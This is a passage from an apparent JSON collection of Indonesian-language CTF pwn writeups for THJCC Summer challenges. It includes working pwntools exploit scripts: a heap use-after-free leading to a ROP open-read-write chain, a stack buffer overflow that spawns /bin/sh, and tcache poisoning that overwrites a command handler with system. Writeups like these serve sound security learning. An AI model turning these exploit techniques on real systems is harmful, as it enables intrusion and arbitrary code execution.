{len(body)=}, {length=:#x}\"\r\n\r\n    menu(io, 1)\r\n    io.recvuntil(b\"slot> \")\r\n    io.sendline(str(slot).encode())\r\n    io.recvuntil(b\"length> \")\r\n    io.sendline(str(length).encode())\r\n    io.recvuntil(b\"subject> \")\r\n    io.sendline(subject)\r\n    io.recvuntil(b\"body> \")\r\n    io.send(body)\r\n    io.recvuntil(b\"composed.\\n\")\r\n\r\n\r\ndef discard(io, slot):\r\n    menu(io, 2)\r\n    io.recvuntil(b\"slot> \")\r\n    io.sendline(str(slot).encode())\r\n    io.recvuntil(b\"discarded.\\n\")\r\n\r\n\r\ndef subscribe(io, slot, channel):\r\n    menu(io, 3)\r\n    io.recvuntil(b\"slot> \")\r\n    io.sendline(str(slot).encode())\r\n    io.recvuntil(b\"channel> \")\r\n    io.sendline(str(channel).encode())\r\n    io.recvuntil(b\"subscribed.\\n\")\r\n\r\n\r\ndef subscribe_many(io, slot, first, count):\r\n    batch = b\"\".join(\r\n        b\"3\\n\" + str(slot).encode() + b\"\\n\" + str(ch).encode() + b\"\\n\"\r\n        for ch in range(first, first + count)\r\n    )\r\n    io.send(batch)\r\n\r\n    for _ in range(count):\r\n        io.recvuntil(b\"subscribed.\\n\")\r\n\r\n\r\ndef subscribe_256(io, slot, start_channel):\r\n    # remote butuh batch biar tidak lambat\r\n    if args.REMOTE or args.FAST:\r\n        subscribe_many(io, slot, start_channel, 256)\r\n    else:\r\n        for ch in range(start_channel, start_channel + 256):\r\n            subscribe(io, slot, ch)\r\n\r\n\r\ndef replay(io, channel, length):\r\n    menu(io, 5)\r\n    io.recvuntil(b\"channel> \")\r\n    io.sendline(str(channel).encode())\r\n    return io.recvn(length)\r\n\r\n\r\ndef amend_raw(io, channel, data, wait=5):\r\n    menu(io, 6)\r\n    io.recvuntil(b\"channel> \")\r\n    io.sendline(str(channel).encode())\r\n    io.recvuntil(b\"body> \")\r\n    io.send(data)\r\n    return io.recvrepeat(wait)\r\n\r\n\r\ndef leak_libc(io):\r\n    large = 0x500\r\n\r\n    compose(io, 0, large, b\"leak\", b\"A\" * large)\r\n    subscribe_256(io, 0, 0)\r\n    discard(io, 0)\r\n\r\n    leak = replay(io, 0, large)\r\n    unsorted_fd = u64(leak[:8])\r\n    log.info(\"unsorted fd: %#x\", unsorted_fd)\r\n\r\n    libc.address = unsorted_fd - UNSORTED_FD_OFFSET\r\n\r\n    if libc.address & 0xFFF:\r\n        log.warning(\"first leak bytes: %r\", leak[:0x40])\r\n        raise RuntimeError(f\"bad libc leak: {libc.address:#x}\")\r\n\r\n    log.success(\"libc base: %#x\", libc.address)\r\n    return libc.address\r\n\r\n\r\ndef leak_environ(io):\r\n    fake = bytearray(0x30)\r\n\r\n    # fake message layout:\r\n    # +0x20 = body pointer\r\n    # +0x28 = body length\r\n    fake[:13] = b\"cat flag.txt\\x00\"\r\n    fake[0x20:0x28] = p64(libc.sym[\"environ\"])\r\n    fake[0x28:0x30] = p64(8)\r\n\r\n    log.info(\"reclaiming stale message chunk\")\r\n    compose(io, 1, 0x30, b\"fake\", bytes(fake))\r\n    log.info(\"reclaimed stale message chunk\")\r\n\r\n    stack_ptr = u64(replay(io, 0, 8))\r\n    log.success(\"environ -> %#x\", stack_ptr)\r\n    return stack_ptr\r\n\r\n\r\ndef prepare_second_uaf(io):\r\n    large = 0x500\r\n\r\n    compose(io, 2, large, b\"leak2\", b\"C\" * large)\r\n    subscribe_256(io, 2, 256)\r\n    discard(io, 2)\r\n\r\n\r\ndef install_fake_message(io, ptr, length):\r\n    fake2 = bytearray(0x30)\r\n    fake2[0x20:0x28] = p64(ptr)\r\n    fake2[0x28:0x30] = p64(length)\r\n    compose(io, 3, 0x30, b\"fake2\", bytes(fake2))\r\n\r\n\r\ndef prepare_stack_rw(io, stack_ptr):\r\n    prepare_second_uaf(io)\r\n\r\n    if args.LEAKSTACK:\r\n        base_off = int(args.STACKOFF or \"500\", 16)\r\n        dump_len = int(args.DUMPLEN or \"900\", 16)\r\n        target = stack_ptr - base_off\r\n\r\n        log.info(\"stack leak target -> %#x\", target)\r\n        log.info(\"stack leak len    -> %#x\", dump_len)\r\n\r\n        install_fake_message(io, target, dump_len)\r\n        return target, dump_len\r\n\r\n    # Dari dump stack remote-mu, saved RIP yang enak ditimpa ada di environ - 0x180.\r\n    # Local juga cocok. Kalau berubah, jalankan: REMOTE LEAKSTACK STACKOFF=500 DUMPLEN=900\r\n    offset = int(args.OFFSET or \"180\", 16)\r\n\r\n    target = stack_ptr - offset\r\n\r\n    # Jangan terlalu besar. 0x2000 lokal bisa crash sebelum return karena stack frame\r\n    # yang masih dipakai ikut ketimpa. 0x1000 aman untuk chain ORW.\r\n    write_len = int(args.WRITELEN or \"1000\", 16)\r\n\r\n    log.info(\"stack target -> %#x\", target)\r\n    log.info(\"write len    -> %#x\", write_len)\r\n\r\n    install_fake_message(io, target, write_len)\r\n    return target, write_len\r\n\r\n\r\ndef get_gadgets():\r\n    rop = ROP(libc)\r\n\r\n    pop_rdi = rop.find_gadget([\"pop rdi\", \"ret\"]).address\r\n    pop_rsi = rop.find_gadget([\"pop rsi\", \"ret\"]).address\r\n    pop_rdx = libc.address + POP_RDX_POP_R12_RET\r\n    pop_rax = libc.address + POP_RAX_RET\r\n    syscall = libc.address + SYSCALL_RET\r\n    ret = rop.find_gadget([\"ret\"]).address\r\n\r\n    log.info(\"ret     : %#x\", ret)\r\n    log.info(\"pop rdi : %#x\", pop_rdi)\r\n    log.info(\"pop rsi : %#x\", pop_rsi)\r\n    log.info(\"pop rdx : %#x\", pop_rdx)\r\n    log.info(\"pop rax : %#x\", pop_rax)\r\n    log.info(\"syscall : %#x\", syscall)\r\n\r\n    return pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, ret\r\n\r\n\r\ndef prdx(pop_rdx, value):\r\n    # pop rdx; pop r12; ret\r\n    return [pop_rdx, value, 0]\r\n\r\n\r\ndef close_fd_chain(fd, pop_rdi, pop_rax, syscall):\r\n    return [pop_rdi, fd, pop_rax, SYS_CLOSE, syscall]\r\n\r\n\r\ndef build_close_fds_chain(pop_rdi, pop_rax, syscall):\r\n    chain = []\r\n    for fd in range(3, 10):\r\n        chain += close_fd_chain(fd, pop_rdi, pop_rax, syscall)\r\n    return chain\r\n\r\n\r\ndef build_openat_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, flags=0):\r\n    # openat(AT_FDCWD, path, flags, 0)\r\n    # mode arg di r10 diabaikan selama O_CREAT tidak dipakai.\r\n    return [\r\n        pop_rdi, AT_FDCWD,\r\n        pop_rsi, path_addr,\r\n        *prdx(pop_rdx, flags),\r\n        pop_rax, SYS_OPENAT,\r\n        syscall,\r\n    ]\r\n\r\n\r\ndef build_open_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, flags=0):\r\n    if args.OPEN:\r\n        # open(path, flags, 0)\r\n        return [\r\n            pop_rdi, path_addr,\r\n            pop_rsi, flags,\r\n            *prdx(pop_rdx, 0),\r\n            pop_rax, SYS_OPEN,\r\n            syscall,\r\n        ]\r\n    return build_openat_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, flags)\r\n\r\n\r\ndef build_orw_payload(target, write_len, file_path):\r\n    pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, ret = get_gadgets()\r\n\r\n    # Layout dibuat konservatif supaya tidak overlap:\r\n    # [ROP chain][padding][path string][padding][read buffer]\r\n    path_off = int(args.PATHOFF or \"300\", 16)\r\n    data_off = int(args.DATAOFF or \"600\", 16)\r\n\r\n    path = file_path.encode() + b\"\\x00\"\r\n    path_addr = target + path_off\r\n    data_addr = target + data_off\r\n\r\n    close_chain = build_close_fds_chain(pop_rdi, pop_rax, syscall)\r\n    open_chain = build_open_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, 0)\r\n\r\n    chain = flat(\r\n        ret,\r\n        close_chain,\r\n        open_chain,\r\n\r\n        # read(3, data_addr, 0x300)\r\n        pop_rdi, 3,\r\n        pop_rsi, data_addr,\r\n        *prdx(pop_rdx, 0x300),\r\n        pop_rax, SYS_READ,\r\n        syscall,\r\n\r\n        # write(1, data_addr, 0x300)\r\n        pop_rdi, 1,\r\n        pop_rsi, data_addr,\r\n        *prdx(pop_rdx, 0x300),\r\n        pop_rax, SYS_WRITE,\r\n        syscall,\r\n\r\n        # exit(0)\r\n        pop_rdi, 0,\r\n        pop_rax, SYS_EXIT,\r\n        syscall,\r\n    )\r\n\r\n    if len(chain) >= path_off:\r\n        raise RuntimeError(\r\n            f\"ROP chain too large: {len(chain):#x} >= PATHOFF {path_off:#x}. \"\r\n            f\"Run with PATHOFF=400 or PATHOFF=500.\"\r\n        )\r\n\r\n    if path_off + len(path) >= data_off:\r\n        raise RuntimeError(\"path overlaps data buffer; increase DATAOFF\")\r\n\r\n    if data_off + 0x300 >= write_len:\r\n        raise RuntimeError(\"data buffer exceeds write len; increase WRITELEN or lower DATAOFF\")\r\n\r\n    payload = bytearray(write_len)\r\n    payload[:len(chain)] = chain\r\n    payload[path_off:path_off + len(path)] = path\r\n\r\n    log.info(\"mode     : ORW\")\r\n    log.info(\"file path: %r\", path[:-1])\r\n    log.info(\"chain sz : %#x\", len(chain))\r\n    log.info(\"path off : %#x\", path_off)\r\n    log.info(\"data off : %#x\", data_off)\r\n    log.info(\"path addr: %#x\", path_addr)\r\n    log.info(\"data addr: %#x\", data_addr)\r\n\r\n    return bytes(payload)\r\n\r\n\r\ndef build_ls_payload(target, write_len, dir_path):\r\n    pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, ret = get_gadgets()\r\n\r\n    path_off = int(args.PATHOFF or \"300\", 16)\r\n    data_off = int(args.DATAOFF or \"600\", 16)\r\n\r\n    path = dir_path.encode() + b\"\\x00\"\r\n    path_addr = target + path_off\r\n    data_addr = target + data_off\r\n\r\n    close_chain = build_close_fds_chain(pop_rdi, pop_rax, syscall)\r\n    open_chain = build_open_chain(path_addr, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, 0x10000)\r\n\r\n    chain = flat(\r\n        ret,\r\n        close_chain,\r\n        open_chain,\r\n\r\n        # getdents64(3, data_addr, 0x300)\r\n        pop_rdi, 3,\r\n        pop_rsi, data_addr,\r\n        *prdx(pop_rdx, 0x300),\r\n        pop_rax, SYS_GETDENTS64,\r\n        syscall,\r\n\r\n        # write(1, data_addr, 0x300)\r\n        pop_rdi, 1,\r\n        pop_rsi, data_addr,\r\n        *prdx(pop_rdx, 0x300),\r\n        pop_rax, SYS_WRITE,\r\n        syscall,\r\n\r\n        pop_rdi, 0,\r\n        pop_rax, SYS_EXIT,\r\n        syscall,\r\n    )\r\n\r\n    if len(chain) >= path_off:\r\n        raise RuntimeError(\"ROP chain too large; increase PATHOFF\")\r\n\r\n    if path_off + len(path) >= data_off:\r\n        raise RuntimeError(\"path overlaps data buffer; increase DATAOFF\")\r\n\r\n    payload = bytearray(write_len)\r\n    payload[:len(chain)] = chain\r\n    payload[path_off:path_off + len(path)] = path\r\n\r\n    log.info(\"mode    : LS\")\r\n    log.info(\"dir path: %r\", path[:-1])\r\n\r\n    return bytes(payload)\r\n\r\n\r\ndef parse_dirents64(data):\r\n    names = []\r\n    i = 0\r\n\r\n    while i + 19 <= len(data):\r\n        reclen = u16(data[i + 16:i + 18])\r\n        if reclen < 19 or i + reclen > len(data):\r\n            i += 1\r\n            continue\r\n\r\n        name = data[i + 19:i + reclen].split(b\"\\x00\", 1)[0]\r\n        if name and all(32 <= c < 127 for c in name):\r\n            s = name.decode(errors=\"replace\")\r\n            if s not in names:\r\n                names.append(s)\r\n            i += reclen\r\n        else:\r\n            i += 1\r\n\r\n    return names\r\n\r\n\r\ndef hexdump_stack(data, base_addr, libc_base):\r\n    print(\"\\n[stack dump]\")\r\n    print(hexdump(data, begin=base_addr))\r\n\r\n    print(\"\\n[possible libc pointers]\")\r\n    for off in range(0, len(data) - 8, 8):\r\n        v = u64(data[off:off + 8])\r\n        if libc_base <= v < libc_base + 0x300000:\r\n            print(f\"+{off:#05x} @ {base_addr + off:#x} = {v:#x}\")\r\n\r\n    print(\"\\n[possible stack pointers]\")\r\n    for off in range(0, len(data) - 8, 8):\r\n        v = u64(data[off:off + 8])\r\n        if 0x7FF000000000 <= v <= 0x7FFFFFFFFFFF:\r\n            print(f\"+{off:#05x} @ {base_addr + off:#x} = {v:#x}\")\r\n\r\n\r\ndef clean_output(data):\r\n    # buang NUL padding supaya output readable\r\n    return data.replace(b\"\\x00\", b\"\")\r\n\r\n\r\ndef extract_flag(data):\r\n    m = FLAG_RE.search(data)\r\n    if not m:\r\n        m = FLAG_RE.search(clean_output(data))\r\n    return m.group(0).decode() if m else None\r\n\r\n\r\ndef exploit_once(file_path=None, ls_path=None):\r\n    io = start()\r\n    try:\r\n        libc_base = leak_libc(io)\r\n        stack_ptr = leak_environ(io)\r\n        target, write_len = prepare_stack_rw(io, stack_ptr)\r\n\r\n        if args.LEAKSTACK:\r\n            dump = replay(io, 256, write_len)\r\n            hexdump_stack(dump, target, libc_base)\r\n            return None, dump\r\n\r\n        if ls_path is not None:\r\n            payload = build_ls_payload(target, write_len, ls_path)\r\n        else:\r\n            payload = build_orw_payload(target, write_len, file_path)\r\n\r\n        wait = float(args.WAIT or 3)\r\n        log.info(\"writing final ROP payload\")\r\n        out = amend_raw(io, 256, payload, wait=wait)\r\n        return extract_flag(out), out\r\n\r\n    finally:\r\n        try:\r\n            io.close()\r\n        except Exception:\r\n            pass\r\n\r\n\r\ndef default_paths():\r\n    # ZIP lokal menaruh flag di CWD challenge, jadi remote besar kemungkinan juga begitu.\r\n    # Jangan default ke /flag.txt saja.\r\n    return [\r\n        \"flag.txt\",\r\n        \"./flag.txt\",\r\n        \"/proc/self/cwd/flag.txt\",\r\n        \"/flag.txt\",\r\n        \"/flag\",\r\n        \"/home/ctf/flag.txt\",\r\n        \"/home/ctf/flag\",\r\n        \"/home/ctf/deja_vu/flag.txt\",\r\n        \"/app/flag.txt\",\r\n        \"/challenge/flag.txt\",\r\n    ]\r\n\r\n\r\ndef main():\r\n    if args.LEAKSTACK:\r\n        exploit_once(file_path=\"flag.txt\")\r\n        return\r\n\r\n    if args.LS:\r\n        dirs = (args.DIRS or args.FILE or \"/proc/self/cwd,/,/home/ctf,/app,/challenge\").split(\",\")\r\n        for d in dirs:\r\n            log.info(\"trying LS %s\", d)\r\n            flag, out = exploit_once(ls_path=d)\r\n            print(f\"\\n[raw ls output for {d!r}]\")\r\n            sys.stdout.buffer.write(clean_output(out))\r\n            sys.stdout.buffer.write(b\"\\n\")\r\n\r\n            names = parse_dirents64(out)\r\n            if names:\r\n                print(\"[parsed entries]\")\r\n                for name in names:\r\n                    print(name)\r\n        return\r\n\r\n    if args.FILE:\r\n        paths = [args.FILE]\r\n    elif args.PATHS:\r\n        paths = args.PATHS.split(\",\")\r\n    else:\r\n        paths = default_paths()\r\n\r\n    last_out = b\"\"\r\n    for path in paths:\r\n        log.info(\"trying file path: %s\", path)\r\n        try:\r\n            flag, out = exploit_once(file_path=path)\r\n            last_out = out\r\n        except Exception as e:\r\n            log.warning(\"attempt failed for %s: %s\", path, e)\r\n            continue\r\n\r\n        cleaned = clean_output(out)\r\n        if cleaned.strip():\r\n            print(f\"\\n[output for {path!r}]\")\r\n            sys.stdout.buffer.write(cleaned)\r\n            if not cleaned.endswith(b\"\\n\"):\r\n                sys.stdout.buffer.write(b\"\\n\")\r\n\r\n        if flag:\r\n            print(f\"\\n<FLAG>{flag}</FLAG>\")\r\n            return\r\n\r\n    print(\"\\n[-] flag belum ke-detect dari path default.\")\r\n    if last_out:\r\n        print(\"[last raw output repr]\")\r\n        print(repr(last_out[:500]))\r\n    print(\"\\nCoba enum directory dulu:\")\r\n    print(\"  python3 solve.py REMOTE LS\")\r\n    print(\"atau pakai path manual:\")\r\n    print(\"  python3 solve.py REMOTE FILE=/path/ke/flag\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{s0_wh1ch_AI_d1d_y0u_us3_t0_s0lv3_th1s???}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-pwn-iatesomethingbad",
    "title": "Writeup CTF PWN — I ate something bad ...",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF PWN — I ate something bad ...",
    "problemDescription": "",
    "tools": [],
    "analysis": "Dari `strings` ditemukan beberapa string menarik:\n\n```text\nwhat do you want to eat?\nWhy you eat this food?\n/bin/sh\nyammy it is not bad food!\n```\n\nTerdapat juga fungsi:\n\n```text\ngets\nsystem\n```\n\nKombinasi `gets()` dan `system()` merupakan indikasi adanya buffer overflow yang dapat mengubah variabel atau kontrol program.\n\n---\n\nKarena binary tidak memiliki symbol `main`, entry point memanggil fungsi utama pada:\n\n```text\n0x401156\n```\n\nDisassembly:\n\n```asm\npush rbp\nmov rbp,rsp\nsub rsp,0x30\n```\n\nProgram membuat stack frame sebesar:\n\n```text\n0x30 byte\n```\n\nKemudian terdapat variabel:\n\n```asm\nmov dword [rbp-4],0\n```\n\nVariabel ini awalnya bernilai:\n\n```text\n0\n```\n\nInput user diterima menggunakan:\n\n```asm\nlea rax,[rbp-0x30]\nmov rdi,rax\ncall gets\n```\n\nArtinya input disimpan pada buffer:\n\n```text\nrbp-0x30\n```\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "**Judul:** I ate something bad ...\n**Kategori:** PWN / Buffer Overflow\n\n**Connection:**\n\n```bash\nnc chal.thjcc.org 11037\n```\n\nDeskripsi:\n\n> Give me some food, but don't give me bad food.\n\nDari deskripsi terlihat ada kemungkinan konsep \"memberi makanan\" berkaitan dengan input user yang harus dimanipulasi.\n\n---"
      },
      {
        "title": "Recon Awal",
        "content": "File yang diberikan:\n\n```text\nchal\nDockerfile\ndocker-compose.yml\nflag.txt\n```\n\nCek proteksi binary:\n\n```bash\nchecksec chal\n```\n\nHasil:\n\n```text\nArch:       amd64-64-little\nRELRO:      No RELRO\nCanary:     No canary found\nPIE:        No PIE\nStack:      Executable\nRWX:        Has RWX segments\n```\n\nProteksi yang tidak aktif:\n\n* Tidak ada stack canary\n* Tidak ada PIE\n* Tidak ada RELRO\n\nHal ini menunjukkan kemungkinan eksploitasi buffer overflow cukup mudah.\n\n---"
      },
      {
        "title": "Menemukan Overflow",
        "content": "Setelah input diterima, program melakukan pengecekan:\n\n```asm\ncmp dword [rbp-4],0xbadf00d\njne fail\n```\n\nAgar program masuk ke kondisi sukses, kita harus mengubah nilai:\n\n```text\nrbp-4\n```\n\nmenjadi:\n\n```text\n0xbadf00d\n```\n\nJarak antara buffer dan target:\n\n```text\nbuffer  = rbp-0x30\ntarget  = rbp-0x4\n\n0x30 - 0x4 = 0x2c\n```\n\nJadi dibutuhkan:\n\n```text\n44 byte padding\n```\n\nLayout payload:\n\n```text\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n+ \n0xbadf00d\n```\n\nKarena sistem menggunakan little endian:\n\n```python\np32(0x0badf00d)\n```\n\nmenghasilkan:\n\n```text\n0d f0 ad 0b\n```\n\n---"
      },
      {
        "title": "Trigger Shell",
        "content": "Jika nilai variabel berhasil diubah, program menjalankan:\n\n```asm\nlea rax,str./bin/sh\nmov rdi,rax\ncall system\n```\n\nSehingga program menjalankan:\n\n```bash\n/bin/sh\n```\n\n---"
      },
      {
        "title": "Exploit",
        "content": "Exploit menggunakan pwntools:\n\n```python\nfrom pwn import *\n\nio = remote(\"chal.thjcc.org\",11037)\n\npayload = b\"A\"*44 + p32(0x0badf00d)\n\nio.sendlineafter(\n    b\"what do you want to eat?\",\n    payload\n)\n\nio.sendline(b\"cat flag.txt\")\n\nio.shutdown(\"send\")\n\nprint(io.recvall().decode())\n```\n\n---"
      },
      {
        "title": "Output",
        "content": "Hasil eksekusi:\n\n```text\nWhy you eat this food?\n\nTHJCC{m4yb3_1_34t_t0_much}\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{m4yb3_1_34t_t0_much}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-pwn-necropet",
    "title": "necropet",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge necropet",
    "problemDescription": "Bug ada di state `desk` dan alur `release`/`revise`. Setelah record di-release, pointer object di `desk` tidak ikut dihapus. `revise` masih menulis ke chunk yang sudah di-free, sehingga didapat primitive UAF write ke entry tcache. Primitive ini dipakai untuk menimpa handler command `cook` dengan `system`, lalu `cook sh` menjalankan command shell.\n\nFlag remote diperoleh langsung dari output service:\n\n```text\nTHJCC{Tell_me,_Linguini,_about_your_interests...D0_u_1ik3_anima1s?The_u5ua1,_d0gs,_cats,_h0r535,_guinea_pigs...RATS~~}\n```",
    "tools": [],
    "analysis": "`admit <slot> <kind> <note_cap> <note_len>` mengalokasikan object dengan ukuran `note_cap + 0x28`. Entry `kennels[slot]` menyimpan pointer object, ukuran allocation, dan case id. `select` menyalin pointer dan metadata tersebut ke global `desk`.\n\n`release` memanggil `free(kennels[slot].object)` dan mengosongkan pointer serta ukuran di `kennels`, tetapi case id di entry dan pointer object di `desk` tidak dibersihkan. Validasi di `revise`, `show`, dan `visit` hanya mencocokkan case id serta slot, sehingga object freed masih dapat diakses melalui `desk`.\n\n### Vulnerability\n\n`revise` memakai ukuran allocation yang tersimpan di `desk`, lalu membaca data mulai dari `desk.object`:\n\n```asm\nmov rdi, [desk]\nmov rax, [desk+8]\n...\ncall read_exact\n```\n\nUkuran yang diizinkan adalah ukuran chunk penuh, jadi setelah `release` fungsi ini menulis langsung ke user area chunk tcache yang sudah dibebaskan. Ini memberi arbitrary tcache forward-pointer overwrite dengan batas panjang chunk.\n\n`visit` juga memanggil `printf(\"%s the %s...\", object, object->species)`. Field `species` dapat diubah lewat `revise`, sehingga pointer ke `kennels` dan GOT dapat dibaca sebagai raw string. Leak yang dipakai:\n\n- pointer object pada `kennels` untuk heap address;\n- pointer `puts` dari GOT untuk libc base;\n- pointer species awal untuk PIE base.",
    "solution": [
      {
        "title": "Proteksi Binary",
        "content": "```text\nELF 64-bit LSB PIE, x86-64, dynamically linked, not stripped\nRELRO: Full RELRO\nCanary: found\nNX: enabled\nPIE: enabled\nSHSTK: enabled\nIBT: enabled\nFORTIFY: enabled\n```\n\nBinary memakai `libc.so.6` dan loader yang disediakan challenge. `solve.py` selalu memakai keduanya pada mode lokal maupun GDB."
      },
      {
        "title": "Strategi Exploit",
        "content": "1. Buat dua object dengan `note_cap=0x20`, sehingga ukuran request malloc adalah `0x48` dan masuk tcache bin yang sama.\n2. Pilih slot 0 dan gunakan `show` untuk memperoleh pointer species, lalu hitung PIE base.\n3. Ubah species pointer dan gunakan `visit` untuk leak pointer slot 0 di `kennels` serta pointer libc dari GOT.\n4. Release slot 1 lalu slot 0. Dua entry tcache diperlukan agar counter bin tetap memungkinkan malloc kedua mengambil poisoned entry.\n5. Dengan UAF `revise`, tulis `target ^ (chunk >> 12)` sebagai safe-linked tcache forward pointer.\n6. Target berada di `commands + 0x90`, yaitu awal entry `cook` pada `commands+0xb0`; target dikembalikan sebagai pointer malloc yang aligned.\n7. Alokasi slot 0 mengambil chunk asli dan alokasi slot 1 mengambil target command table. Ukuran minimum `0x48` membuat memset object berhenti sebelum global stdio di `.bss`.\n8. Pilih slot 1 dan revisi object target. Tulis ulang nama `cook` pada offset 0 dan alamat `system` pada offset `0x10`, yaitu field handler.\n9. Kirim `cook sh`, kemudian command `cat ./thisisratratratrat_puipui.txt` dibaca oleh shell."
      },
      {
        "title": "Exploit Final",
        "content": "`solve.py` menghitung semua base address dari leak runtime. Mode yang tersedia:\n\n```bash\npython3 solve.py\npython3 solve.py GDB\npython3 solve.py REMOTE HOST=chal.thjcc.org PORT=1024\n```\n\nOutput penting saat remote berhasil:\n\n```text\nPIE base: 0x701f7b7d6000\nheap chunk: 0x555574e3e2a0\nlibc base: 0x701f7b5c2000\ncommand output: ... THJCC{Tell_me,_Linguini,_about_your_interests...D0_u_1ik3_anima1s?The_u5ua1,_d0gs,_cats,_h0r535,_guinea_pigs...RATS~~}\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Exploit tidak memakai alamat ASLR hardcoded. Safe-linking dihitung dari pointer chunk yang bocor. Dua chunk tcache dengan ukuran sama wajib dipertahankan; satu chunk saja membuat libc challenge mengabaikan entry kedua karena counter tcache tidak konsisten."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\nfrom pwn import *\r\n\r\nBASE_DIR = Path(__file__).resolve().parent\r\nBINARY_PATH = BASE_DIR / \"necropet\"\r\nLOADER_PATH = BASE_DIR / \"ld-linux-x86-64.so.2\"\r\nLIBC_PATH = BASE_DIR / \"libc.so.6\"\r\n\r\ncontext.binary = elf = ELF(str(BINARY_PATH), checksec=False)\r\nlibc = ELF(str(LIBC_PATH), checksec=False)\r\ncontext.log_level = \"info\"\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        return remote(args.HOST or \"chal.thjcc.org\", int(args.PORT or 1024))\r\n    if args.GDB:\r\n        return gdb.debug(\r\n            [str(LOADER_PATH), \"--library-path\", str(BASE_DIR), str(BINARY_PATH)],\r\n            gdbscript=\"set pagination off\\ncontinue\",\r\n        )\r\n    return process([str(LOADER_PATH), \"--library-path\", str(BASE_DIR), str(BINARY_PATH)])\r\n\r\n\r\ndef cmd(io, line):\r\n    io.sendline(line)\r\n\r\n\r\ndef admit(io, slot, cap=0x20, kind=0):\r\n    cmd(io, f\"admit {slot} {kind} {cap} 0\".encode())\r\n    io.recvuntil(b\"admitted\\n\", timeout=3)\r\n\r\n\r\ndef select(io, slot):\r\n    cmd(io, f\"select {slot}\".encode())\r\n    io.recvuntil(b\"selected\\n\", timeout=3)\r\n\r\n\r\ndef revise(io, data):\r\n    cmd(io, f\"revise {len(data)}\".encode())\r\n    io.send(data)\r\n    io.recvuntil(b\"revised\\n\", timeout=3)\r\n\r\n\r\ndef visit(io):\r\n    cmd(io, b\"visit\")\r\n    return io.recvuntil(b\"\\n\", timeout=3)\r\n\r\n\r\ndef show(io):\r\n    cmd(io, b\"show\")\r\n    line = io.recvuntil(b\"\\n\", timeout=3)\r\n    if not line.startswith(b\"record: \"):\r\n        raise RuntimeError(f\"unexpected show output: {line!r}\")\r\n    return bytes.fromhex(line[8:].decode().strip())\r\n\r\n\r\ndef raw_leak(io, target):\r\n    revise(io, b\"A\" * 0x18 + p64(target))\r\n    out = visit(io)\r\n    marker = b\" the \"\r\n    if marker not in out:\r\n        raise RuntimeError(f\"unexpected visit output: {out!r}\")\r\n    leaked = out.split(marker, 1)[1]\r\n    return leaked.split(b\" keeps very still.\", 1)[0]\r\n\r\n\r\ndef exploit(io):\r\n    admit(io, 0)\r\n    admit(io, 1)\r\n    select(io, 0)\r\n\r\n    record = show(io)\r\n    species = u64(record[0x18:0x20])\r\n    pie = None\r\n    for needle in (b\"cat\\0\", b\"dog\\0\", b\"rabbit\\0\", b\"marten\\0\", b\"crow\\0\", b\"guinea pig\\0\"):\r\n        off = next(elf.search(needle), None)\r\n        if off is not None and species >= off:\r\n            candidate = species - off\r\n            if candidate & 0xfff == 0:\r\n                pie = candidate\r\n                break\r\n    if pie is None:\r\n        raise RuntimeError(f\"could not derive PIE from species pointer {species:#x}\")\r\n    log.success(f\"PIE base: {pie:#x}\")\r\n\r\n    heap_bytes = raw_leak(io, pie + elf.symbols[\"kennels\"])\r\n    if len(heap_bytes) < 6:\r\n        raise RuntimeError(f\"short heap leak: {heap_bytes!r}\")\r\n    chunk = u64(heap_bytes.ljust(8, b\"\\0\"))\r\n    log.success(f\"heap chunk: {chunk:#x}\")\r\n\r\n    libc_bytes = b\"\"\r\n    for symbol in (\"puts\", \"malloc\", \"free\", \"fgets\", \"fread\", \"printf\", \"__printf_chk\"):\r\n        if symbol not in elf.got:\r\n            continue\r\n        candidate = raw_leak(io, pie + elf.got[symbol])\r\n        if len(candidate) > len(libc_bytes):\r\n            libc_bytes = candidate\r\n        if len(candidate) >= 6:\r\n            break\r\n    if len(libc_bytes) < 6:\r\n        raise RuntimeError(f\"short libc leak: {libc_bytes!r}\")\r\n    puts = u64(libc_bytes.ljust(8, b\"\\0\"))\r\n    libc.address = puts - libc.sym[\"puts\"]\r\n    log.success(f\"libc base: {libc.address:#x}\")\r\n\r\n    select(io, 1)\r\n    cmd(io, b\"release 1\")\r\n    io.recvuntil(b\"released\\n\", timeout=3)\r\n    select(io, 0)\r\n    cmd(io, b\"release 0\")\r\n    io.recvuntil(b\"released\\n\", timeout=3)\r\n\r\n    target = pie + 0x50b0\r\n    encoded = target ^ (chunk >> 12)\r\n    revise(io, p64(encoded) + b\"B\" * (0x48 - 8))\r\n    admit(io, 0)\r\n    admit(io, 1)\r\n    select(io, 1)\r\n    revise(io, b\"cook\\0\" + b\"A\" * 0xb + p64(libc.sym[\"system\"]))\r\n    debug = show(io)\r\n    log.info(f\"handler bytes: {debug[0x10:0x18].hex()} expected {p64(libc.sym['system']).hex()}\")\r\n\r\n    cmd(io, b\"cook sh\")\r\n    io.sendline(b\"cat ./thisisratratratrat_puipui.txt\")\r\n    data = io.recvrepeat(1)\r\n    log.info(f\"command output: {data!r}\")\r\n    if 